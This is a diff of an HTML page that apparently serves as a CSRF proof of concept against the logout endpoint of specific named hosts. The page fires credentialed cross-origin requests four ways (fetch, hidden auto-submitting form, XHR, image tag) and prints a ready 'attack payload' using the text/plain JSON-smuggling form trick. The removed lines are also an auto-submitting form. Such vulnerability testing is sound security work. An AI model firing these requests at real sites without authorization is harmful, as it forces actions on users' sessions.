@@ -1,3 +1,243 @@
-<form action="https://demo.app.welfordacademy.com/api/auth/logout" method="POST">
-</form>
-<script>document.forms[0].submit()</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test - Logout Endpoint</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        h1 {
+            color: #e94560;
+            border-bottom: 2px solid #e94560;
+            padding-bottom: 10px;
+        }
+        .card {
+            background: #16213e;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #0f3460;
+        }
+        .btn {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .btn:hover {
+            background: #c73e54;
+        }
+        .btn-danger {
+            background: #ff6b6b;
+        }
+        #result {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            white-space: pre-wrap;
+            font-family: monospace;
+        }
+        .vulnerable {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        .protected {
+            color: #4ecdc4;
+            font-weight: bold;
+        }
+        .info {
+            color: #a0a0a0;
+            font-size: 14px;
+        }
+        code {
+            background: #0f3460;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔒 CSRF Vulnerability Test</h1>
+    
+    <div class="card">
+        <h2>Target Endpoint</h2>
+        <p><code>POST /api/auth/logout</code></p>
+        <p><code>Host: iag-tst-3.welford.net</code></p>
+        <p class="info">This test checks if the logout endpoint is vulnerable to Cross-Site Request Forgery (CSRF) attacks.</p>
+    </div>
+
+    <div class="card">
+        <h2>Test Options</h2>
+        
+        <h3>Method 1: Fetch API Test</h3>
+        <p class="info">Uses fetch() with credentials to simulate cross-origin request</p>
+        <button class="btn" onclick="testCSRF()">Run Fetch Test</button>
+        
+        <h3>Method 2: Form Auto-Submit</h3>
+        <p class="info">Creates and auto-submits a hidden form</p>
+        <button class="btn" onclick="testForm()">Run Form Test</button>
+        
+        <h3>Method 3: XMLHttpRequest</h3>
+        <p class="info">Legacy XHR method</p>
+        <button class="btn" onclick="testXHR()">Run XHR Test</button>
+        
+        <h3>Method 4: Image Tag Trick</h3>
+        <p class="info">Uses img tag (limited - GET only)</p>
+        <button class="btn btn-danger" onclick="testImg()">Run Image Test</button>
+    </div>
+
+    <div class="card">
+        <h2>Test Results</h2>
+        <div id="result">Click a button to run tests...</div>
+    </div>
+
+    <div class="card">
+        <h2>Attack Payload (for malicious page)</h2>
+        <p class="info">If vulnerable, an attacker could host this HTML on their domain:</p>
+        <pre><code>&lt;form id="csrf" method="POST" 
+      action="https://iag-tst-3.welford.net/api/auth/logout"
+      enctype="text/plain"&gt;
+  &lt;input type="hidden" name='{"ignore":"' value='"}' &gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</code></pre>
+    </div>
+
+    <script>
+        const targetUrl = 'https://iag-tst-3.welford.net/api/auth/logout';
+        const resultDiv = document.getElementById('result');
+
+        function logResult(message, isVulnerable = null) {
+            const timestamp = new Date().toLocaleTimeString();
+            let cssClass = '';
+            if (isVulnerable === true) cssClass = 'vulnerable';
+            if (isVulnerable === false) cssClass = 'protected';
+            
+            resultDiv.innerHTML += `\n[${timestamp}] <span class="${cssClass}">${message}</span>`;
+        }
+
+        function clearResults() {
+            resultDiv.innerHTML = 'Running tests...\n';
+        }
+
+        // Method 1: Fetch API
+        async function testCSRF() {
+            clearResults();
+            logResult('Testing with Fetch API...');
+            
+            try {
+                const response = await fetch(targetUrl, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: '{}'
+                });
+                
+                const text = await response.text();
+                logResult(`Status: ${response.status}`);
+                logResult(`Response: ${text.substring(0, 150)}`);
+                
+                if (response.status === 200 || response.status === 204) {
+                    logResult('⚠️ VULNERABLE - Request succeeded!', true);
+                    logResult('Logout was successful without authorization header!');
+                } else if (response.status === 401 || response.status === 403) {
+                    logResult('✓ Protected - Server rejected unauthorized request', false);
+                } else {
+                    logResult(`Response code: ${response.status} - Manual review needed`);
+                }
+            } catch (error) {
+                logResult(`Error: ${error.message}`, false);
+                if (error.message.includes('CORS')) {
+                    logResult('CORS is blocking cross-origin requests', false);
+                }
+            }
+        }
+
+        // Method 2: Form Auto-Submit
+        function testForm() {
+            clearResults();
+            logResult('Testing with Form Auto-Submit...');
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = targetUrl;
+            form.target = '_blank';
+            
+            // Hidden input with JSON-like data
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'data';
+            input.value = '{}';
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            
+            logResult('Form submitted (opens in new tab)');
+            logResult('Check if logout occurred in new tab');
+            
+            form.submit();
+        }
+
+        // Method 3: XMLHttpRequest
+        function testXHR() {
+            clearResults();
+            logResult('Testing with XMLHttpRequest...');
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', targetUrl, true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    logResult(`Status: ${xhr.status}`);
+                    logResult(`Response: ${xhr.responseText.substring(0, 150)}`);
+                    
+                    if (xhr.status === 200 || xhr.status === 204) {
+                        logResult('⚠️ VULNERABLE - Request succeeded!', true);
+                    } else if (xhr.status === 0) {
+                        logResult('Request blocked (likely CORS)', false);
+                    } else {
+                        logResult(`Response code: ${xhr.status}`);
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                logResult('Request failed - likely blocked by CORS', false);
+            };
+            
+            xhr.send('{}');
+        }
+
+        // Method 4: Image Tag
+        function testImg() {
+            clearResults();
+            logResult('Testing with Image Tag (limited - GET only)...');
+            logResult('Note: This only works if server accepts GET for logout');
+            
+            const img = new Image();
+            img.onload = function() {
+                logResult('Image loaded - server responded (200 OK)', true);
+            };
+            img.onerror = function() {
+                logResult('Image failed - either 404 or CORS blocked', false);
+            };
+            img.src = targetUrl + '?_csrf_test=' + Date.now();
+        }
+    </script>
+</body>
+</html>
